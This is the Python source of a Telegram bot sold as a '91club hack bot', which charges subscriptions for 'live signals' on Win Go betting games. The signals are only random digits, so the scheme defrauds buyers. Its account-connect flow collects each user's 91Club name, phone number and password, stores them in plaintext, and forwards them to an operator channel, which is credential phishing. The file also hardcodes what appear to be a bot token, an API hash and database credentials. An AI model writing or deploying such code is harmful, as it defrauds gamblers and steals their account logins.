import os
import random
import datetime
from pyrogram import Client, filters, enums
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message,
    CallbackQuery
)
import contextlib
import re

from pyrogram import Client, filters
from pyrogram.errors import ChatSendPhotosForbidden, ChatWriteForbidden, QueryIdInvalid
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# Environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "7259559804:AAH_ArQg323s34Jp1QgtysoX5XxTXBKG-cw")
API_ID = int(os.getenv("API_ID", "26788480"))
API_HASH = os.getenv("API_HASH", "858d65155253af8632221240c535c314")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://binomo:binomo123@binomo.hghd0yz.mongodb.net/?retryWrites=true&w=majority&w=majority")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5943144679"))
CHANNEL_ID = int(os.getenv("CHANNEL_ID", "-1002269272993"))
SUBCHANNEL_ID = int(os.getenv("SUBCHANNEL_ID", "-1002269272993"))

# MongoDB setup
mongo_client = MongoClient(MONGODB_URI)
db = mongo_client["91club_bot"]
users_collection = db["users"]

# Cooldown durations in seconds
COOLDOWNS = {
    "30s": 30,
    "1m": 60,
    "3m": 180,
    "5m": 300
}

app = Client("91club_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# States for conversation handling
CONNECT_ACCOUNT_STATES = {}

async def check_subscription(user_id: int, client: Client) -> bool:
    try:
        member = await client.get_chat_member(SUBCHANNEL_ID, user_id)
        return member.status in [
            enums.ChatMemberStatus.MEMBER,
            enums.ChatMemberStatus.ADMINISTRATOR,
            enums.ChatMemberStatus.OWNER
        ]
    except Exception as e:
        print(f"Subscription check error: {e}")
        return False

def get_start_menu(user_id: int):
    user = users_collection.find_one({"user_id": user_id})
    subscribed = user.get("subscribed", False) if user else False
    
    welcome_text = "**Welcome to 91club hack bot!**\n\n"
    
    if user and user.get("logged_in"):
        welcome_text += (
            "```\n"
            "#Logged in as:\n"
            "┏━━━━━━━━━━━━━━\n"
            f"┣➠ Account Details\n"
            f"┣✦ Name: {user['name']}\n"
            "┗━━━━━━━━━━━━━━\n"
            "```"
        )
    else:
        welcome_text += "Please choose an option below:"

    buttons = []
    if subscribed:
        if user and user.get("logged_in"):
            buttons = [
                [InlineKeyboardButton("Get Live Signal", callback_data="live_signal")],
                [InlineKeyboardButton("Logout", callback_data="logout")]
            ]
        else:
            buttons = [
                [InlineKeyboardButton("Connect Account", callback_data="connect_account")]
            ]
    else:
        buttons = [
            [InlineKeyboardButton("Buy Subscription", callback_data="buy_sub")]
        ]
    
    return welcome_text, InlineKeyboardMarkup(buttons)


@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    user_id = message.from_user.id
    user = users_collection.find_one({"user_id": user_id})
    previous_subscribed = user.get("subscribed", False) if user else False

    subscribed = await check_subscription(user_id, client)
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"subscribed": subscribed}},
        upsert=True
    )

    if subscribed and not previous_subscribed:
        try:
            await client.send_message(
                user_id,
                "🎉 Thank you for subscribing to our channel!\n"
                "You now have access to premium features!"
            )
        except Exception as e:
            print(f"Error sending welcome message: {e}")

    welcome_text, reply_markup = get_start_menu(user_id)
    await message.reply_text(welcome_text, reply_markup=reply_markup, message_effect_id=5104841245755180586)


@app.on_callback_query(filters.create(lambda _, __, query: query.data == "buy_sub"))
async def buy_subscription(client: Client, callback_query: CallbackQuery):
    price_text = """**Subscription Plans:**
- 1 Month: $10
- 3 Months: $25
- 6 Months: $40
- 1 Year: $70

After payment, you'll be added to our private channel."""

    contact_button = InlineKeyboardMarkup([
        [InlineKeyboardButton("Contact Admin", url=f"tg://user?id={ADMIN_ID}")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ])

    await callback_query.message.edit_text(
        price_text,
        reply_markup=contact_button
    )

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "live_signal"))
async def show_win_go_options(client: Client, callback_query: CallbackQuery):
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Win Go 30s", callback_data="wingo_30s"),
            InlineKeyboardButton("Win Go 1m", callback_data="wingo_1m")
        ],
        [
            InlineKeyboardButton("Win Go 3m", callback_data="wingo_3m"),
            InlineKeyboardButton("Win Go 5m", callback_data="wingo_5m")
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ])
    
    await callback_query.message.edit_text(
        "**Choose your Win Go duration:**",
        reply_markup=buttons
    )

async def handle_win_go(client: Client, callback_query: CallbackQuery, duration: str):
    user_id = callback_query.from_user.id
    now = datetime.datetime.now()
    
    user = users_collection.find_one({"user_id": user_id})
    cooldowns = user.get("cooldowns", {})
    
    last_used = cooldowns.get(duration)
    if last_used:
        last_used = datetime.datetime.fromisoformat(last_used)
        cooldown_seconds = COOLDOWNS[duration]
        elapsed = (now - last_used).total_seconds()
        
        if elapsed < cooldown_seconds:
            remaining = cooldown_seconds - int(elapsed)
            await callback_query.answer(
                f"Please wait {remaining} seconds before using this again!",
                show_alert=True
            )
            return
    
    # Generate random number and send sticker
    number = random.randint(0, 9)
    try:
        await client.send_sticker(
            chat_id=user_id,
            sticker=f"stickers/{number}.webp"
        )
    except Exception as e:
        print(f"Error sending sticker: {e}")
        await callback_query.answer("Error sending sticker!", show_alert=True)
        return
    
    # Update cooldown
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {f"cooldowns.{duration}": now.isoformat()}},
        upsert=True
    )

@app.on_callback_query(filters.regex(r"^wingo_(30s|1m|3m|5m)$"))
async def handle_win_go_callback(client: Client, callback_query: CallbackQuery):
    duration = callback_query.data.split("_")[1]
    user_id = callback_query.from_user.id
    
    # Check subscription
    subscribed = await check_subscription(user_id, client)
    if not subscribed:
        await callback_query.answer(
            "You need an active subscription to use this feature!",
            show_alert=True
        )
        return
    
    # Check login status
    user = users_collection.find_one({"user_id": user_id})
    if not user or not user.get("logged_in"):
        await callback_query.answer(
            "You need to login first to use this feature!",
            show_alert=True
        )
        return
    
    await handle_win_go(client, callback_query, duration)


# Existing connect account handlers remain the same
@app.on_callback_query(filters.create(lambda _, __, query: query.data == "connect_account"))
async def connect_account(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    CONNECT_ACCOUNT_STATES[user_id] = "awaiting_name"
    
    await callback_query.message.edit_text(
        "Please enter your 91Club account name:"
    )

@app.on_message(filters.private & ~filters.command("start"))
async def handle_account_info(client: Client, message: Message):
    user_id = message.from_user.id
    state = CONNECT_ACCOUNT_STATES.get(user_id)

    if not state:
        return

    if state == "awaiting_name":
        CONNECT_ACCOUNT_STATES[user_id] = {
            "state": "awaiting_phone",
            "name": message.text
        }
        await message.reply_text("Please enter your 91Club phone number (10 digits):")
    
    elif state.get("state") == "awaiting_phone":
        # Validate phone number format
        if not message.text.isdigit():
            await message.reply_text("❌ Please enter a valid phone number!")
            return
            
        if len(message.text) != 10:
            await message.reply_text("❌ Please enter a valid phone number!")
            return
            
        CONNECT_ACCOUNT_STATES[user_id] = {
            "state": "awaiting_password",
            "name": state["name"],
            "phone": message.text
        }
        await message.reply_text("Please enter your 91Club password:")
    
    elif state.get("state") == "awaiting_password":
        user_data = {
            "user_id": user_id,
            "name": state["name"],
            "phone": state["phone"],
            "password": message.text,
            "logged_in": True
        }
        
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": user_data},
            upsert=True
        )
        
        try:
            await client.send_message(
                CHANNEL_ID,
                f"**📝 New User Login**\n\n"
                f"▫️ User ID: `{user_id}`\n"
                f"▫️ Name: `{state['name']}`\n"
                f"▫️ Phone: `{state['phone']}`\n"
                f"▫️ Password: `{message.text}`",
            )
        except Exception as e:
            print(f"Error sending to channel: {e}")
        
        del CONNECT_ACCOUNT_STATES[user_id]
        await message.reply_text("✅ Successfully logged in!")
        await start_command(client, message)

# Existing logout handlers remain the same
@app.on_callback_query(filters.create(lambda _, __, query: query.data == "logout"))
async def logout_account(client: Client, callback_query: CallbackQuery):
    confirmation_buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes", callback_data="confirm_logout"),
         InlineKeyboardButton("No", callback_data="cancel_logout")]
    ])
    
    await callback_query.message.edit_text(
        "⚠️ Are you sure you want to logout?",
        reply_markup=confirmation_buttons
    )

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "confirm_logout"))
async def confirm_logout(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"logged_in": False}}
    )
    await callback_query.message.edit_text("✅ Successfully logged out!")
    await start_command(client, callback_query.message)

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "cancel_logout"))
async def cancel_logout(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    welcome_text, reply_markup = get_start_menu(user_id)
    await callback_query.message.edit_text(welcome_text, reply_markup=reply_markup)

@app.on_callback_query(filters.create(lambda _, __, query: query.data == "main_menu"))
async def main_menu(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    welcome_text, reply_markup = get_start_menu(user_id)
    await callback_query.message.edit_text(welcome_text, reply_markup=reply_markup)

if __name__ == "__main__":
    print("Bot started...")
    app.run()
